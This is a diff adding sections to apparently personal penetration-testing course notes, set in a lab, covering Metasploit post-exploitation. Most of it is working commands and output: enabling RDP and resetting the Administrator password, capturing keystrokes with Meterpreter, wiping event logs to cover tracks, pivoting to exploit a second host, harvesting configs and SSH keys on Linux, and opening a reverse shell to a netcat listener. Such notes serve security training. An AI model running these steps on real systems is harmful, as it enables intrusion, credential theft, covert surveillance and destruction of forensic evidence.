@@ -58,6 +58,9 @@
     - Clearing Windows Event Logs    
     - Pivoting    
   - Linux Post Exploitation
+    - Linux Post Exploitation Modules
+    - Exploiting A Vulnerable Program    
+    - Dumping Hashes With Hashdump    
 
 - ##### Armitage
 
@@ -4160,18 +4163,741 @@ meterpreter >
 
 #### Enabling RDP    
 
++ The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system.
++ RDP uses TCP port 3389 by default.
++ RDP is disabled by default, however, we can utilize an MSF exploit module to enable RDP on the Windows target and consequently utilize RDP to remotely access to the target system.
++ RDP authentication requires a legitimate user account on the target system as well as the user’s password in clear-text.
 
 
 
+**gaining access**
+
+```bash
+meterpreter > sysinfo 
+Computer        : WIN-OMCNBKR66MN
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 0
+Meterpreter     : x86/windows
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
 
 
 
+**enable rdp `post/windows/manage/enable_rdp` **
+
+```bash
+msf5 exploit(windows/http/badblue_passthru) > use post/windows/manage/enable_rdp
+msf5 post(windows/manage/enable_rdp) > options 
+
+Module options (post/windows/manage/enable_rdp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   ENABLE    true             no        Enable the RDP Service and Firewall Exception.
+   FORWARD   false            no        Forward remote port 3389 to local Port.
+   LPORT     3389             no        Local port to forward remote connection.
+   PASSWORD                   no        Password for the user created.
+   SESSION                    yes       The session to run this module on.
+   USERNAME                   no        The username of the user to create.
+
+msf5 post(windows/manage/enable_rdp) > set SESSION 1
+SESSION => 1
+msf5 post(windows/manage/enable_rdp) > run
+
+[*] Enabling Remote Desktop
+[*] 	RDP is already enabled
+[*] Setting Terminal Services service startup mode
+[*] 	The Terminal Services service is not set to auto, changing it to auto ...
+[+] 	RDP Service Started
+[*] 	Opening port in local firewall if necessary
+[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20240205234008_default_10.4.24.123_host.windows.cle_627721.txt
+[*] Post module execution completed
+```
 
 
 
+**confirm the port 3389 is open**
+
+```bash
+root@attackdefense:~# nmap 10.4.24.123 -p3389
+Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-05 23:41 IST
+Nmap scan report for 10.4.24.123
+Host is up (0.0089s latency).
+
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+```
+
+
+
+**change `Administrator` password to have valid credential to login with**
+
+Note: it is a big indicator that the system is hacked. if you do not want to do that then try crack password hashes or perform path-the-hash attack 
+
+```cmd
+meterpreter > shell
+Process 2320 created.
+Channel 2 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>net users
+net users
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    
+The command completed with one or more errors.
+
+
+C:\Windows\system32>net user Administrator P@ssword123
+net user Administrator P@ssword123
+The command completed successfully.
+```
+
+
+
+**connect to the target using RDP**
+
+```bash
+root@attackdefense:~# xfreerdp /u:Administrator /p:P@ssword123 /v:10.4.24.123
+```
+
+
+
+---
 
 #### Windows Keylogging    
 
++ Keylogging is the process of recording or capturing the keystrokes entered on a target system.
++ This technique is not limited to post exploitation, there are plenty of programs and USB devices that can be used to capture and transmit the keystrokes entered on a system.
++ Meterpreter on a Windows system provides us with the ability to capture the keystrokes entered on a target system and download them back to our local system.
+
+```bash
+meterpreter > keyscan_start 
+Starting the keystroke sniffer ...
+
+meterpreter > keyscan_dump 
+Dumping captured keystrokes...
+<Shift>User<Right Shift>: admin<CR>
+<Shift>Pass<Right Shift>: pasword123
+
+meterpreter > keyscan_stop
+Stopping the keystroke sniffer...
+
+```
+
+
+
+---
+
 #### Clearing Windows Event Logs    
 
++ The Windows OS stores and catalogs all actions/events performed on the system and stores them in the Windows Event log.
++ Event logs are categorized based on the type of events they store:
++ Application logs: Stores application/program events like startups, crashes etc.
++ System logs: Stores system events like startups, reboots etc.
++ Security logs: Stores security events like password changes, authentication failures
+etc.
++ Event logs can be accessed via the Event Viewer on Windows.
++ The event logs are the first stop for any forensic investigator after a compromise has been detected. It is therefore very important to clear your tracks after you are done with your assessment.
+
+
+
+```bash
+meterpreter > clearev 
+[*] Wiping 254 records from Application...
+[*] Wiping 504 records from System...
+[*] Wiping 15901 records from Security...
+
+```
+
+
+
+---
+
 #### Pivoting   
+
++ Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised host’s private internal network.
++ After gaining access to one host, we can use the compromised host to exploit other hosts on the same internal network to which we could not access
+previously.
++ Meterpreter provides us with the ability to add a network route to the internal network’s subnet and consequently scan and exploit other systems on the network.
+
+
+
+we have two victims: 
+
+```cmd
+victim-1: 10.4.28.249
+victim-2: 10.4.30.60
+```
+
+
+
+gaining access to victim-1
+
+```bash
+meterpreter > ipconfig 
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 12
+============
+Name         : AWS PV Network Device #0
+Hardware MAC : 0e:d9:18:3c:d1:c5
+MTU          : 9001
+IPv4 Address : 10.4.28.249
+IPv4 Netmask : 255.255.240.0
+IPv6 Address : fe80::f5ac:e010:5a9a:3b
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+
+Interface 24
+============
+Name         : Microsoft ISATAP Adapter #2
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1280
+IPv6 Address : fe80::5efe:a04:1cf9
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+```
+
+We can observe, there is only one network adapter and we have two machine IP addresses. But, we cannot access “Victim Machine 2” directly from the attacker’s machine.
+
+
+
+We will add a route and then we will run an auxiliary port scanner module on the second victim machine to discover a host and open ports.
+
+```
+meterpreter > run autoroute -s 10.4.28.0/20
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 10.4.28.0/255.255.240.0...
+[+] Added route to 10.4.28.0/255.255.240.0 via 10.4.28.249
+[*] Use the -p option to list all active routes
+
+
+
+Background session 1? [y/N]  
+msf6 exploit(windows/http/rejetto_hfs_exec) > sessions -n victim-1 -i 1
+[*] Session 1 named to victim-1
+msf6 exploit(windows/http/rejetto_hfs_exec) > sessions 
+
+Active sessions
+===============
+
+  Id  Name      Type                     Information                                      Connection
+  --  ----      ----                     -----------                                      ----------
+  1   victim-1  meterpreter x86/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCNBKR66MN  10.10.80.9:4444 -> 10.4.28.249:49371 (10.4.28.249)
+
+
+
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) > options 
+
+Module options (auxiliary/scanner/portscan/tcp):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   CONCURRENCY  10               yes       The number of concurrent ports to check per host
+   DELAY        0                yes       The delay between connections, per thread, in milliseconds
+   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
+   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
+   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   THREADS      1                yes       The number of concurrent threads (max one per host)
+   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
+
+msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 10.4.30.60
+RHOSTS => 10.4.30.60
+msf6 auxiliary(scanner/portscan/tcp) > run
+
+[+] 10.4.30.60:           - 10.4.30.60:80 - TCP OPEN
+[+] 10.4.30.60:           - 10.4.30.60:139 - TCP OPEN
+[+] 10.4.30.60:           - 10.4.30.60:135 - TCP OPEN
+[+] 10.4.30.60:           - 10.4.30.60:445 - TCP OPEN
+
+```
+
+ We have discovered port 80 on the pivot machine. Now, we will forward the remote port 80 to local port 1234 and grab the banner using Nmap
+
+
+
+forward traffic from attacker machine port 1234 to victim-2 port 80
+
+```bash
+msf6 auxiliary(scanner/portscan/tcp) > sessions 1
+[*] Starting interaction with victim-1...
+
+meterpreter > portfwd add -l 1234 -p 80 -r 10.4.30.60
+[*] Local TCP relay created: :1234 <-> 10.4.30.60:80
+
+```
+
+
+
+now use Nmap to find the running application name and version.
+
+```bash
+root@attackdefense:~# nmap 127.0.0.1 -p1234 -sV
+Starting Nmap 7.91 ( https://nmap.org ) at 2024-02-06 01:50 IST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000051s latency).
+
+PORT     STATE SERVICE VERSION
+1234/tcp open  http    BadBlue httpd 2.7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+```
+
+
+
+exploit badblue on victim-2
+
+```bash
+msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/http/badblue_passthru
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/http/badblue_passthru) > set PAYLOAD windows/meterpreter/bind_tcp
+PAYLOAD => windows/meterpreter/bind_tcp
+msf6 exploit(windows/http/badblue_passthru) > set RHOST 10.4.30.60
+RHOST => 10.4.30.60
+msf6 exploit(windows/http/badblue_passthru) > set LPORT 4433
+LPORT => 4433
+msf6 exploit(windows/http/badblue_passthru) > options 
+
+Module options (exploit/windows/http/badblue_passthru):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS   10.4.30.60       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    80               yes       The target port (TCP)
+   SSL      false            no        Negotiate SSL/TLS for outgoing connections
+   VHOST                     no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/bind_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LPORT     4433             yes       The listen port
+   RHOST     10.4.30.60       no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   BadBlue EE 2.7 Universal
+
+
+msf6 exploit(windows/http/badblue_passthru) > run
+
+[*] Trying target BadBlue EE 2.7 Universal...
+[*] Started bind TCP handler against 10.4.30.60:4433
+[*] Sending stage (175174 bytes) to 10.4.30.60
+[*] Meterpreter session 2 opened (10.4.28.249:51330 -> 10.4.30.60:4433) at 2024-02-06 01:55:36 +0530
+
+meterpreter > sysinfo
+Computer        : ATTACKDEFENSE
+OS              : Windows 2016+ (10.0 Build 17763).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter > getuid
+Server username: ATTACKDEFENSE\Administrator
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface  4
+============
+Name         : AWS PV Network Device #0
+Hardware MAC : 0e:6c:6e:aa:0a:d7
+MTU          : 9001
+IPv4 Address : 10.4.30.60
+IPv4 Netmask : 255.255.240.0
+IPv6 Address : fe80::b4b7:1619:f59e:1ee8
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+
+```
+
+
+
+---
+
+### Linux Post Exploitation
+
+#### Linux Post Exploitation Modules
+
++ The MSF provides us with various post exploitation modules for both Windows and Linux.
++ We can utilize these post exploitation modules to enumerate information about the Linux system we currently have access to:
+  + Enumerate system configuration
+  + Enumerate environment variables
+  + Enumerate network configuration
+  + VM check
+  + Enumerate user history
+
+
+
+**enumerate the target manually**
+
+```bash
+root@victim-1:/tmp# groups root
+groups root
+root : root
+
+root@victim-1:/tmp# cat /etc/*issue
+cat /etc/*issue
+Debian GNU/Linux 8 \n \l
+
+root@victim-1:/tmp# uname -a
+uname -a
+Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 GNU/Linux
+
+root@victim-1:/tmp#  ps aux
+ ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.0  20044  2888 ?        Ss   21:36   0:00 /bin/bash /root/start.sh
+root          82  0.0  0.0  17504  2040 ?        R    21:53   0:00 ps aux
+```
+
+
+
+
+
+**list services that are currently listening on open ports**
+
+```bash
+root@victim-1:/tmp# netstat -antp
+```
+
+
+
+**enumerate environment variables**
+
+```bash
+root@victim-1:/tmp# env
+env
+USER=root
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/x
+PWD=/tmp
+HOME=/root
+```
+
+
+
+**list of post exploitation modules that you can run on a linux machine**
+
+- post/linux/gather/enum_configs
+- post/multi/gather/env
+- post/linux/gather/enum_network
+- post/linux/gather/enum_protections
+- post/linux/gather/enum_system
+- post/linux/gather/checkcontainer
+- post/linux/gather/checkvm
+- post/linux/gather/enum_users_history
+- post/multi/manage/system_session
+- post/linux/manage/download_exec
+
+
+
+
+
+**gather linux config files `post/linux/gather/enum_configs`**
+
+```bash
+msf5 > use post/linux/gather/enum_configs
+msf5 post(linux/gather/enum_configs) > options 
+
+Module options (post/linux/gather/enum_configs):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+msf5 post(linux/gather/enum_configs) > set SESSION 2
+SESSION => 2
+msf5 post(linux/gather/enum_configs) > run
+
+[*] Running module against 192.200.70.3 [victim-1]
+[*] Info:
+[*]     Debian GNU/Linux 8  
+[*]     Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 GNU/Linux
+[-] Failed to open file: /etc/apache2/apache2.conf: core_channel_open: Operation failed: 1
+[-] Failed to open file: /etc/apache2/ports.conf: core_channel_open: Operation failed: 1
+[-] Failed to open file: /etc/ufw/sysctl.conf: core_channel_open: Operation failed: 1
+[-] Failed to open file: /etc/security.access.conf: core_channel_open: Operation failed: 1
+[+] shells stored in /root/.msf4/loot/20240205214300_default_192.200.70.3_linux.enum.conf_674152.txt
+[+] sepermit.conf stored in /root/.msf4/loot/20240205214300_default_192.200.70.3_linux.enum.conf_821143.txt
+[+] ca-certificates.conf stored in /root/.msf4/loot/20240205214300_default_192.200.70.3_linux.enum.conf_315693.txt
+[+] access.conf stored in /root/.msf4/loot/20240205214300_default_192.200.70.3_linux.enum.conf_926112.txt
+[-] Failed to open file: /etc/gated.conf: core_channel_open: Operation failed: 1
+[+] rpc stored in /root/.msf4/loot/20240205214301_default_192.200.70.3_linux.enum.conf_102370.txt
+[+] ldap.conf stored in /root/.msf4/loot/20240205214302_default_192.200.70.3_linux.enum.conf_016087.txt
+[-] Failed to open file: /etc/openldap/openldap.conf: core_channel_open: Operation failed: 1
+[-] Failed to open file: /etc/cups/cups.conf: core_channel_open: Operation failed: 1
+[-] Failed to open file: /etc/opt/lampp/etc/httpd.conf: core_channel_open: Operation failed: 1
+[+] sysctl.conf stored in /root/.msf4/loot/20240205214302_default_192.200.70.3_linux.enum.conf_767727.txt
+
+[*] Post module execution completed
+```
+
+
+
+
+
+**gather linux environment variables `post/multi/gather/env`**
+
+```bash
+msf5 > use post/multi/gather/env
+msf5 post(multi/gather/env) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                  Connection
+  --  ----  ----                   -----------                                  ----------
+  1         shell cmd/unix                                                      192.200.70.2:36205 -> 192.200.70.3:445 (192.200.70.3)
+  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.200.70.3  192.200.70.2:4433 -> 192.200.70.3:37596 (192.200.70.3)
+
+msf5 post(multi/gather/env) > set SESSION 2
+SESSION => 2
+msf5 post(multi/gather/env) > run
+
+[*] Debian 8.11 (Linux 5.4.0-152-generic)
+[*] Post module execution completed
+```
+
+
+
+
+
+**gather network information `post/linux/gather/enum_network`**
+
+```bash
+msf5 > use post/linux/gather/enum_network
+msf5 post(linux/gather/enum_network) > set SESSION 2
+SESSION => 2
+msf5 post(linux/gather/enum_network) > run
+
+[*] Running module against 192.200.70.3
+[*] Module running as root
+[+] Info:
+[+]     Debian GNU/Linux 8  
+[+]     Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 GNU/Linux
+[*] Collecting data...
+[-] Failed to open file: /etc/ssh/sshd_config: core_channel_open: Operation failed: 1
+[-] Unable to get data for Network config
+[-] Unable to get data for Route table
+[+] Firewall config stored in /root/.msf4/loot/20240205220851_default_192.200.70.3_linux.enum.netwo_608498.txt
+[+] DNS config stored in /root/.msf4/loot/20240205220851_default_192.200.70.3_linux.enum.netwo_108511.txt
+[-] Unable to get data for SSHD config
+[+] Host file stored in /root/.msf4/loot/20240205220851_default_192.200.70.3_linux.enum.netwo_663614.txt
+[+] SSH keys stored in /root/.msf4/loot/20240205220851_default_192.200.70.3_linux.enum.netwo_041954.txt
+[-] Unable to get data for Active connections
+[-] Unable to get data for Wireless information
+[-] Unable to get data for Listening ports
+[+] If-Up/If-Down stored in /root/.msf4/loot/20240205220851_default_192.200.70.3_linux.enum.netwo_595093.txt
+[*] Post module execution completed
+```
+
+
+
+**gather security features enabled `post/linux/gather/enum_protections`**
+
+  This module checks whether popular system hardening mechanisms are  in place, such as SMEP, SMAP, SELinux, PaX and grsecurity.
+
+```bash
+msf5 > use post/linux/gather/enum_protections
+msf5 post(linux/gather/enum_protections) > set SESSION 2
+SESSION => 2
+msf5 post(linux/gather/enum_protections) > run
+
+[*] Running module against 192.200.70.3 [victim-1]
+[*] Info:
+[*]     Debian GNU/Linux 8  
+[*]     Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 GNU/Linux
+[*] Finding system protections...
+[+] ASLR is enabled
+[+] SMEP is enabled
+[+] SMAP is enabled
+[+] Yama is installed and enabled
+[*] Finding installed applications...
+[+] iptables found: /sbin/iptables
+[+] tcpdump found: /usr/sbin/tcpdump
+[+] wireshark found: /usr/bin/wireshark
+[*] Post module execution completed
+```
+
+
+
+
+
+**gather system and user information `post/linux/gather/enum_system`**
+
+This module gathers system information. We collect installed  packages, installed services, mount information, user list, user bash history and cron jobs
+
+```bash
+msf5 > use post/linux/gather/enum_system
+msf5 post(linux/gather/enum_system) > set SESSION 2
+SESSION => 2
+msf5 post(linux/gather/enum_system) > run
+
+[+] Info:
+[+]     Debian GNU/Linux 8  
+[+]     Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 GNU/Linux
+[+]     Module running as "root" user
+[*] Linux version stored in /root/.msf4/loot/20240205221605_default_192.200.70.3_linux.enum.syste_481990.txt
+[*] User accounts stored in /root/.msf4/loot/20240205221605_default_192.200.70.3_linux.enum.syste_424978.txt
+[*] Installed Packages stored in /root/.msf4/loot/20240205221605_default_192.200.70.3_linux.enum.syste_000906.txt
+[*] Running Services stored in /root/.msf4/loot/20240205221605_default_192.200.70.3_linux.enum.syste_155545.txt
+[*] Cron jobs stored in /root/.msf4/loot/20240205221605_default_192.200.70.3_linux.enum.syste_738030.txt
+[*] Disk info stored in /root/.msf4/loot/20240205221605_default_192.200.70.3_linux.enum.syste_984893.txt
+[*] Logfiles stored in /root/.msf4/loot/20240205221605_default_192.200.70.3_linux.enum.syste_349440.txt
+[*] Setuid/setgid files stored in /root/.msf4/loot/20240205221605_default_192.200.70.3_linux.enum.syste_625052.txt
+[*] Post module execution completed
+```
+
+
+
+**check if the system is a docker container `post/linux/gather/checkcontainer`**
+
+This module attempts to determine whether the system is running inside of a container and if so, which one. This module supports detection of Docker, LXC, and systemd nspawn.
+
+```bash
+usbmuxmsf5 > use post/linux/gather/checkcontainer
+msf5 post(linux/gather/checkcontainer) > set SESSION 2
+SESSION => 2
+msf5 post(linux/gather/checkcontainer) > run
+
+[+] This appears to be a 'Docker' container
+[*] Post module execution completed
+```
+
+There are many privilege escalation techniques that can break out of the container and gain access to the host system that is running the container 
+
+
+
+**check if the system is a virtual machine `post/linux/gather/checkvm`**
+
+This module attempts to determine whether the system is running inside of a virtual environment and if so, which one. This module supports detection of Hyper-V, VMWare, VirtualBox, Xen, and QEMU/KVM.
+
+```bash
+msf5 > use post/linux/gather/checkvm
+msf5 post(linux/gather/checkvm) > set SESSION 2
+SESSION => 2
+msf5 post(linux/gather/checkvm) > run
+
+[*] Gathering System info ....
+[-] Failed to open file: /proc/scsi/scsi: core_channel_open: Operation failed: 1
+[-] Post failed: NoMethodError undefined method `gsub' for nil:NilClass
+[-] Call stack:
+[-]   /usr/share/metasploit-framework/modules/post/linux/gather/checkvm.rb:74:in `run'
+[*] Post module execution completed
+```
+
+
+
+**enumerate users history `post/linux/gather/enum_users_history`**
+
+```bash
+msf5 > use post/linux/gather/enum_users_history
+msf5 post(linux/gather/enum_users_history) > set SESSION 2
+SESSION => 2
+msf5 post(linux/gather/enum_users_history) > run
+
+[+] Info:
+[+]     Debian GNU/Linux 8  
+[+]     Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 GNU/Linux
+[-] Failed to open file: /root/.ash_history: core_channel_open: Operation failed: 1
+[-] Failed to open file: /root/.bash_history: core_channel_open: Operation failed: 1
+[-] Failed to open file: /etc/sudoers: core_channel_open: Operation failed: 1
+[+] Last logs stored in /root/.msf4/loot/20240205222635_default_192.200.70.3_linux.enum.users_852767.txt
+[*] Post module execution completed
+```
+
+
+
+**get reverse shell `post/multi/manage/system_session`**
+
+This module will create a Reverse TCP Shell on the target system using the system's own scripting environments installed on the target.
+
+```bash
+msf5 > use post/multi/manage/system_session
+msf5 post(multi/manage/system_session) > set SESSION 2
+SESSION => 2
+msf5 post(multi/manage/system_session) > options 
+
+Module options (post/multi/manage/system_session):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  false            yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     yes       IP of host that will receive the connection from the payload.
+   LPORT    4433             no        Port for Payload to connect to.
+   SESSION  2                yes       The session to run this module on.
+   TYPE     auto             yes       Scripting environment on target to use for reverse shell (Accepted: auto, ruby, python, perl, bash)
+
+msf5 post(multi/manage/system_session) > set LHOST eth1
+LHOST => 192.200.70.2
+msf5 post(multi/manage/system_session) > run
+
+[*] Perl was found on target
+[*] Perl reverse shell selected
+[*] Executing reverse tcp shell to 192.200.70.2 on port 4433
+[*] Post module execution completed
+
+
+
+
+
+
+root@attackdefense:~# nc -nvlp 4433
+listening on [any] 4433 ...
+connect to [192.200.70.2] from (UNKNOWN) [192.200.70.3] 53724
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+
+
+
+
+
+
+
+
+Exploiting A Vulnerable Program    
+
+Dumping Hashes With Hashdump    
